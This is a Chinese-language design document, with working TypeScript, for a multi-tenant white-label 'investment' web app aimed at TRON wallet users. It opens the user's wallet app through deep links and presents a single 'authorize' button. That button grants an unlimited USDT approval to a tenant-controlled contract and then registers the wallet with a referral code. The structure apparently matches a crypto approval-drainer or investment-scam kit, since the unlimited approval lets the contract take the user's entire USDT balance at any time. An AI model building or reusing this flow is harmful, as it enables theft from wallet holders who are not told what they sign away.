# Customer Web 設計文件

> 建立日期：2026-01-16

## 概述

Customer Web 是面向投資客戶的前端應用，使用 Next.js 建立。主要功能：

1. **轉導頁面**：喚醒錢包 App，導向投資頁面
2. **投資頁面**：顯示租戶客製化內容，執行錢包授權並註冊客戶

---

## 需求決策

| 項目 | 決定 |
|------|------|
| 進入方式 | 連結分享 + QR Code |
| 錢包支援 | 多錢包通用（TronLink, imToken, TokenPocket 等），可擴展 |
| 租戶客製化 | 每個租戶一個資料夾，完全客製化，共用基礎設施 |
| 授權流程 | 僅授權，自動註冊（不需填寫額外資料） |
| 推薦碼保存 | URL 參數 + LocalStorage 備份 |
| 租戶識別 | 獨立域名 + 動態 API 查詢 |
| 授權金額 | 無限授權 |

---

## 架構設計

### 檔案結構

```
apps/customer-web/
├── package.json
├── next.config.js
├── tsconfig.json
├── tailwind.config.js
├── middleware.ts                    # 租戶識別
├── app/
│   ├── layout.tsx                   # 根 Layout
│   ├── not-found.tsx                # 404 頁面
│   ├── redirect/
│   │   └── page.tsx                 # 轉導頁面（通用）
│   └── (tenant)/                    # 租戶頁面群組
│       ├── layout.tsx               # 注入租戶 context
│       ├── page.tsx                 # 首頁（載入租戶 InvestPage）
│       └── success/
│           └── page.tsx             # 授權成功頁面
├── tenants/                         # 租戶客製化頁面
│   ├── index.ts                     # 租戶註冊表
│   ├── tenant-a/
│   │   ├── InvestPage.tsx
│   │   ├── SuccessPage.tsx
│   │   └── styles.module.css
│   └── tenant-b/
│       ├── InvestPage.tsx
│       ├── SuccessPage.tsx
│       └── styles.module.css
├── shared/
│   ├── components/
│   │   ├── ErrorDisplay.tsx
│   │   ├── LoadingSpinner.tsx
│   │   └── WalletButton.tsx
│   ├── hooks/
│   │   ├── useWallet.ts
│   │   ├── useApprove.ts
│   │   ├── useReferral.ts
│   │   └── useTenant.ts
│   ├── lib/
│   │   ├── api.ts
│   │   ├── errors.ts
│   │   ├── wallets/
│   │   │   ├── index.ts
│   │   │   ├── tronlink.ts
│   │   │   ├── imtoken.ts
│   │   │   └── tokenpocket.ts
│   │   └── constants.ts
│   ├── types/
│   │   ├── tenant.ts
│   │   ├── wallet.ts
│   │   └── global.d.ts              # window.tronWeb 類型
│   └── context/
│       └── TenantContext.tsx
└── public/
    └── images/
```

### 核心流程

```
用戶點擊連結/掃 QR → /redirect?ref=ABC&wallet=tronlink
       ↓
轉導頁面：儲存推薦碼 → 生成 deeplink → 喚醒錢包
       ↓
錢包內開啟：/invest（帶租戶域名）
       ↓
投資頁面：讀取推薦碼 → 顯示租戶頁面 → 用戶點擊授權
       ↓
錢包授權 approve → 成功後調用 /contracts/execute 註冊
```

---

## 轉導頁面設計

### URL 格式

```
https://[任意域名]/redirect?ref=ABC123&wallet=tronlink
```

| 參數 | 說明 | 範例值 |
|------|------|--------|
| `ref` | 推薦碼 | `ABC123` |
| `wallet` | 錢包類型 | `tronlink`, `imtoken`, `tokenpocket` |

### 錢包 Deeplink 配置

```typescript
// shared/lib/wallets/index.ts

export const walletConfigs = {
  tronlink: {
    name: 'TronLink',
    buildDeeplink: (targetUrl: string) => {
      const param = { url: targetUrl, action: 'open', protocol: 'tronlink', version: '1.0' };
      return `tronlinkoutside://pull.activity?param=${encodeURIComponent(JSON.stringify(param))}`;
    },
  },
  imtoken: {
    name: 'imToken',
    buildDeeplink: (targetUrl: string) =>
      `imtokenv2://navigate?screen=DappView&url=${encodeURIComponent(targetUrl)}`,
  },
  tokenpocket: {
    name: 'TokenPocket',
    buildDeeplink: (targetUrl: string) =>
      `tpdapp://open?params=${encodeURIComponent(JSON.stringify({ url: targetUrl }))}`,
  },
  // 未來可擴展更多錢包
};

export type WalletType = keyof typeof walletConfigs;
```

### 頁面流程

1. 解析 URL 參數 (`ref`, `wallet`)
2. 儲存推薦碼到 LocalStorage
3. 根據 `wallet` 參數生成 deeplink
4. 自動跳轉（或顯示「打開錢包」按鈕作為 fallback）

### UI 行為

- 顯示簡單的 loading 畫面
- 顯示「正在打開錢包...」
- 若 3 秒未跳轉，顯示手動按鈕

---

## 投資頁面設計

### 授權邏輯

```typescript
// shared/hooks/useApprove.ts

export function useApprove() {
  const approve = async (
    spenderAddress: string,  // 租戶的投資合約地址
    tokenAddress: string,    // USDT Token 地址
  ) => {
    const tronWeb = window.tronWeb;
    const contract = await tronWeb.contract().at(tokenAddress);

    // 無限授權 (2^256 - 1)
    const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

    const tx = await contract.approve(spenderAddress, MAX_UINT256).send();
    return tx; // 交易 hash
  };

  return { approve };
}
```

### 註冊 API 調用

```typescript
// shared/lib/api.ts

export async function registerCustomer(params: {
  walletAddress: string;
  approvedAmount: number;
  approvalTxHash: string;
  referralCode?: string;
}) {
  const response = await fetch(`${TENANT_API_URL}/contracts/execute`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(params),
  });
  return response.json();
}
```

### 頁面流程

1. 檢測錢包連接狀態 (`window.tronWeb`)
2. 從 LocalStorage 讀取推薦碼
3. 顯示租戶客製化頁面內容
4. 用戶點擊「授權」按鈕
5. 調用 `approve()` 進行無限授權
6. 授權成功後調用 `registerCustomer()`
7. 顯示成功畫面

### 租戶頁面範例

```tsx
// tenants/tenant-a/InvestPage.tsx

import { useWallet } from '@/shared/hooks/useWallet';
import { useApprove } from '@/shared/hooks/useApprove';
import { useReferral } from '@/shared/hooks/useReferral';
import { registerCustomer } from '@/shared/lib/api';

export default function TenantAInvestPage({ tenantConfig }) {
  const { address, isConnected } = useWallet();
  const { approve } = useApprove();
  const { referralCode } = useReferral();

  const handleAuthorize = async () => {
    // 1. 授權
    const txHash = await approve(
      tenantConfig.investmentContractAddress,
      tenantConfig.usdtTokenAddress,
    );

    // 2. 註冊
    await registerCustomer({
      walletAddress: address,
      approvedAmount: -1, // 無限授權
      approvalTxHash: txHash,
      referralCode,
    });
  };

  // 租戶 A 完全客製化的 UI
  return (
    <div className="tenant-a-custom-design">
      {/* 任意設計 */}
      <button onClick={handleAuthorize}>授權投資</button>
    </div>
  );
}
```

### 傳入租戶頁面的 Props

| Prop | 說明 |
|------|------|
| `tenantConfig` | 租戶配置（合約地址、USDT 地址、品牌等） |

---

## Middleware 與租戶識別

### 識別方式

- 根據請求的域名查詢後端 API 獲取租戶資訊
- 使用記憶體快取（5 分鐘 TTL）優化效能

### Middleware 實現

```typescript
// middleware.ts

import { NextRequest, NextResponse } from 'next/server';

// 記憶體快取
const tenantCache = new Map<string, { data: TenantInfo; expiry: number }>();
const CACHE_TTL = 5 * 60 * 1000; // 5 分鐘

async function getTenantByDomain(domain: string): Promise<TenantInfo | null> {
  // 檢查快取
  const cached = tenantCache.get(domain);
  if (cached && cached.expiry > Date.now()) {
    return cached.data;
  }

  // 從 API 獲取
  try {
    const res = await fetch(
      `${process.env.PLATFORM_API_URL}/tenants/by-domain/${encodeURIComponent(domain)}`,
      { next: { revalidate: 300 } }
    );
    if (!res.ok) return null;

    const tenant = await res.json();

    // 存入快取
    tenantCache.set(domain, { data: tenant, expiry: Date.now() + CACHE_TTL });

    return tenant;
  } catch {
    return null;
  }
}

export async function middleware(request: NextRequest) {
  const hostname = request.headers.get('host')?.replace(':3000', '') || '';
  const pathname = request.nextUrl.pathname;

  // 排除不需要處理的路徑
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api') ||
    pathname.match(/\.(ico|png|jpg|svg|css|js)$/)
  ) {
    return NextResponse.next();
  }

  // 轉導頁面不需要租戶識別（通用）
  if (pathname.startsWith('/redirect')) {
    return NextResponse.next();
  }

  const tenant = await getTenantByDomain(hostname);

  if (!tenant) {
    return NextResponse.rewrite(new URL('/not-found', request.url));
  }

  // 注入租戶資訊到 headers
  const requestHeaders = new Headers(request.headers);
  requestHeaders.set('x-tenant-slug', tenant.slug);
  requestHeaders.set('x-tenant-config', JSON.stringify(tenant.config));

  return NextResponse.next({
    request: { headers: requestHeaders },
  });
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

### 後端需新增 API

```
GET /tenants/by-domain/:domain

Response:
{
  "slug": "tenant-a",
  "name": "租戶 A",
  "config": {
    "investmentContractAddress": "Txxxxx",
    "usdtTokenAddress": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "branding": {
      "logo": "https://...",
      "primaryColor": "#FF6600"
    }
  }
}
```

---

## 錯誤處理

### 錯誤類型分類

| 類型 | 情境 | 處理方式 |
|------|------|----------|
| 租戶錯誤 | 域名無對應租戶 | 顯示 404 頁面 |
| 錢包錯誤 | 未安裝錢包、未連接、網絡錯誤 | 引導用戶操作 |
| 授權錯誤 | 用戶拒絕、餘額不足、交易失敗 | 顯示具體原因並可重試 |
| API 錯誤 | 後端錯誤、網絡問題 | 顯示錯誤並可重試 |

### 錯誤定義

```typescript
// shared/lib/errors.ts

export enum ErrorCode {
  // 錢包相關
  WALLET_NOT_FOUND = 'WALLET_NOT_FOUND',
  WALLET_NOT_CONNECTED = 'WALLET_NOT_CONNECTED',
  WALLET_WRONG_NETWORK = 'WALLET_WRONG_NETWORK',

  // 授權相關
  APPROVE_REJECTED = 'APPROVE_REJECTED',
  APPROVE_FAILED = 'APPROVE_FAILED',
  INSUFFICIENT_BALANCE = 'INSUFFICIENT_BALANCE',

  // API 相關
  API_ERROR = 'API_ERROR',
  NETWORK_ERROR = 'NETWORK_ERROR',

  // 租戶相關
  TENANT_NOT_FOUND = 'TENANT_NOT_FOUND',
}

export class AppError extends Error {
  constructor(
    public code: ErrorCode,
    public message: string,
    public originalError?: unknown,
  ) {
    super(message);
  }
}

export const errorMessages: Record<ErrorCode, string> = {
  [ErrorCode.WALLET_NOT_FOUND]: '請在錢包 App 中開啟此頁面',
  [ErrorCode.WALLET_NOT_CONNECTED]: '請先連接錢包',
  [ErrorCode.WALLET_WRONG_NETWORK]: '請切換到 TRON 主網',
  [ErrorCode.APPROVE_REJECTED]: '您已取消授權',
  [ErrorCode.APPROVE_FAILED]: '授權失敗，請重試',
  [ErrorCode.INSUFFICIENT_BALANCE]: '餘額不足',
  [ErrorCode.API_ERROR]: '系統錯誤，請稍後重試',
  [ErrorCode.NETWORK_ERROR]: '網絡連線異常',
  [ErrorCode.TENANT_NOT_FOUND]: '頁面不存在',
};
```

### 錢包檢測 Hook

```typescript
// shared/hooks/useWallet.ts

import { useState, useEffect } from 'react';
import { AppError, ErrorCode } from '../lib/errors';

interface WalletState {
  isReady: boolean;
  isConnected: boolean;
  address: string | null;
  error: AppError | null;
}

export function useWallet() {
  const [state, setState] = useState<WalletState>({
    isReady: false,
    isConnected: false,
    address: null,
    error: null,
  });

  useEffect(() => {
    const checkWallet = async () => {
      // 檢查 TronWeb 是否存在
      if (typeof window.tronWeb === 'undefined') {
        setState({
          isReady: true,
          isConnected: false,
          address: null,
          error: new AppError(
            ErrorCode.WALLET_NOT_FOUND,
            '請在錢包 App 中開啟此頁面'
          ),
        });
        return;
      }

      // 等待錢包注入完成
      await new Promise(resolve => setTimeout(resolve, 500));

      const tronWeb = window.tronWeb;

      // 檢查是否連接
      if (!tronWeb.ready) {
        setState({
          isReady: true,
          isConnected: false,
          address: null,
          error: new AppError(
            ErrorCode.WALLET_NOT_CONNECTED,
            '請先連接錢包'
          ),
        });
        return;
      }

      // 成功連接
      setState({
        isReady: true,
        isConnected: true,
        address: tronWeb.defaultAddress.base58,
        error: null,
      });
    };

    checkWallet();
  }, []);

  return state;
}
```

### 授權 Hook（含錯誤處理）

```typescript
// shared/hooks/useApprove.ts

import { useState } from 'react';
import { AppError, ErrorCode } from '../lib/errors';

interface ApproveState {
  isLoading: boolean;
  error: AppError | null;
  txHash: string | null;
}

export function useApprove() {
  const [state, setState] = useState<ApproveState>({
    isLoading: false,
    error: null,
    txHash: null,
  });

  const approve = async (
    spenderAddress: string,
    tokenAddress: string,
  ): Promise<string> => {
    setState({ isLoading: true, error: null, txHash: null });

    try {
      const tronWeb = window.tronWeb;
      const contract = await tronWeb.contract().at(tokenAddress);

      const MAX_UINT256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

      const tx = await contract.approve(spenderAddress, MAX_UINT256).send();

      setState({ isLoading: false, error: null, txHash: tx });
      return tx;

    } catch (err: any) {
      let error: AppError;

      if (err.message?.includes('cancel') || err.message?.includes('reject')) {
        error = new AppError(ErrorCode.APPROVE_REJECTED, '您已取消授權', err);
      } else if (err.message?.includes('balance')) {
        error = new AppError(ErrorCode.INSUFFICIENT_BALANCE, '餘額不足', err);
      } else {
        error = new AppError(ErrorCode.APPROVE_FAILED, '授權失敗，請重試', err);
      }

      setState({ isLoading: false, error, txHash: null });
      throw error;
    }
  };

  const reset = () => {
    setState({ isLoading: false, error: null, txHash: null });
  };

  return { ...state, approve, reset };
}
```

### 錯誤顯示元件

```tsx
// shared/components/ErrorDisplay.tsx

import { AppError, errorMessages } from '../lib/errors';

interface Props {
  error: AppError;
  onRetry?: () => void;
}

export function ErrorDisplay({ error, onRetry }: Props) {
  return (
    <div className="error-container">
      <p className="error-message">
        {errorMessages[error.code] || error.message}
      </p>
      {onRetry && (
        <button onClick={onRetry} className="retry-button">
          重試
        </button>
      )}
    </div>
  );
}
```

---

## 租戶動態載入

### 租戶註冊表

```typescript
// tenants/index.ts

import { ComponentType } from 'react';

interface TenantPages {
  InvestPage: ComponentType<TenantPageProps>;
  SuccessPage: ComponentType<TenantPageProps>;
}

interface TenantPageProps {
  tenantConfig: TenantConfig;
}

const tenantRegistry: Record<string, () => Promise<TenantPages>> = {
  'tenant-a': () => import('./tenant-a').then(m => ({
    InvestPage: m.InvestPage,
    SuccessPage: m.SuccessPage,
  })),
  'tenant-b': () => import('./tenant-b').then(m => ({
    InvestPage: m.InvestPage,
    SuccessPage: m.SuccessPage,
  })),
};

export async function getTenantPages(slug: string): Promise<TenantPages | null> {
  const loader = tenantRegistry[slug];
  if (!loader) return null;
  return loader();
}

export function isTenantRegistered(slug: string): boolean {
  return slug in tenantRegistry;
}
```

### 動態載入租戶頁面

```tsx
// app/(tenant)/page.tsx

import { headers } from 'next/headers';
import { notFound } from 'next/navigation';
import { getTenantPages } from '@/tenants';

export default async function TenantInvestPage() {
  const headersList = headers();
  const slug = headersList.get('x-tenant-slug');
  const configStr = headersList.get('x-tenant-config');

  if (!slug || !configStr) {
    notFound();
  }

  const tenantConfig = JSON.parse(configStr);
  const pages = await getTenantPages(slug);

  if (!pages) {
    notFound();
  }

  const { InvestPage } = pages;

  return <InvestPage tenantConfig={tenantConfig} />;
}
```

---

## TypeScript 類型定義

### TronWeb 全域類型

```typescript
// shared/types/global.d.ts

interface TronWeb {
  ready: boolean;
  defaultAddress: {
    base58: string;
    hex: string;
  };
  contract(): {
    at(address: string): Promise<any>;
  };
  toSun(amount: number): string;
  fromSun(amount: string): number;
}

interface Window {
  tronWeb?: TronWeb;
}
```

### 租戶類型

```typescript
// shared/types/tenant.ts

export interface TenantConfig {
  investmentContractAddress: string;
  usdtTokenAddress: string;
  branding?: {
    logo?: string;
    primaryColor?: string;
    secondaryColor?: string;
  };
}

export interface TenantInfo {
  slug: string;
  name: string;
  config: TenantConfig;
}
```

---

## 環境變數

```bash
# .env.local

# API URLs
PLATFORM_API_URL=http://localhost:3000
TENANT_API_URL=http://localhost:3001

# 公開變數（前端可用）
NEXT_PUBLIC_TENANT_API_URL=http://localhost:3001
```

---

## 後端需配合的修改

### 新增 API Endpoint

Platform API 需新增根據域名查詢租戶的 endpoint：

```
GET /tenants/by-domain/:domain
```

### Response 格式

```json
{
  "slug": "tenant-a",
  "name": "租戶 A",
  "config": {
    "investmentContractAddress": "Txxxxx",
    "usdtTokenAddress": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    "branding": {
      "logo": "https://...",
      "primaryColor": "#FF6600"
    }
  }
}
```

---

## 實作優先順序

1. **專案初始化** - Next.js 專案、基礎配置
2. **共用基礎設施** - hooks、lib、types
3. **Middleware** - 租戶識別
4. **轉導頁面** - `/redirect`
5. **投資頁面框架** - `app/(tenant)/page.tsx`
6. **第一個租戶頁面** - `tenants/tenant-a/`
7. **後端 API** - `/tenants/by-domain/:domain`
